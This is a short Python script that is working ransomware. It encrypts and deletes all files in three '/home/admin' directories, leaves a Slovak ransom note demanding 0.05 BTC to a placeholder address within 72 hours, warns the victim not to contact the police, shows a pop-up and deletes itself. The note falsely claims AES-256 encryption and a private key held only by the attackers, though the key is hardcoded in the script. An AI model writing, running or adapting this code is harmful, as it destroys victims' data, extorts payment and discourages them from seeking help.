#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet
import subprocess

key = b'Ua8lR_CqhnPMeOr4mvL-DAs8G-ZC1GJY4AZ55o7c24w='
cipher = Fernet(key)

dirs_to_encrypt = [
    '/home/admin/critical_docs',
    '/home/admin/internal_docs',
    '/home/admin/logs'
]

for directory in dirs_to_encrypt:
    for root, dirs, files in os.walk(directory):
        for file in files:
            filepath = os.path.join(root, file)
            with open(filepath, 'rb') as f:
                data = f.read()
            encrypted_data = cipher.encrypt(data)
            with open(filepath + '.encrypted', 'wb') as enc_file:
                enc_file.write(encrypted_data)
            os.remove(filepath)

# Ransomware poznámka
ransom_message = '''
⚠️ VAŠE SÚBORY BOLI ZAŠIFROVANÉ RANSOMWAROM "CYBERLOCK-X" ⚠️

Všetky dôležité dokumenty, konfiguračné súbory a citlivé informácie na tomto zariadení boli zašifrované silným algoritmom AES-256.
Bez súkromného kľúča, ktorý máme iba my, je obnovenie vašich dát nemožné.

Ak sa pokúsite o obnovenie dát svojpomocne, súbory budú natrvalo zničené.

🔑 AKO OBNOVIŤ SVOJE DÁTA?
-------------------------------------------------
Na obnovu dát je potrebné zaplatiť výkupné vo výške:

          ➡️ 0.05 BTC (Bitcoin) ⬅️

Platbu zašlite na túto bitcoinovú adresu:

👉 1XYZFakeBitcoinAddress987654321xyz

Čas na zaplatenie je obmedzený: 72 hodín (3 dni).
Po tejto lehote budú vaše dáta navždy stratené!

📧 AKO POSTUPOVAŤ PO ZAPLATENÍ?
-------------------------------------------------
Po úspešnom zaplatení výkupného pošlite e-mail na adresu:

➡️ decrypt-support@protonmail.com

Predmet správy musí byť váš jedinečný identifikátor: ADMIN_PC_UBUNTU_01

Po overení platby vám bude zaslaný unikátny dešifrovací kľúč spolu s návodom na obnovu dát.

🔴 UPOZORNENIE:
-------------------------------------------------
- Nepokúšajte sa kontaktovať políciu alebo inú autoritu. Týmto krokom stratíte možnosť na obnovu dát.
- Ak neobdržíme platbu v stanovenom čase, kľúč na dešifrovanie vašich dát bude navždy vymazaný!

Čas vám beží!

CYBERLOCK-X Team
'''

with open('/home/admin/README_RANSOMWARE.txt', 'w') as ransom_note:
    ransom_note.write(ransom_message)

# Otvorenie grafického pop-up okna 
subprocess.Popen([
    'zenity',
    '--error',
    '--width=500',
    '--title=⚠️ CYBERLOCK-X RANSOMWARE ⚠️',
    '--text=Vaše súbory boli zašifrované ransomwarom CYBERLOCK-X!\nPodrobnosti nájdete v súbore README_RANSOMWARE.txt na ploche!'
])

os.remove(__file__)
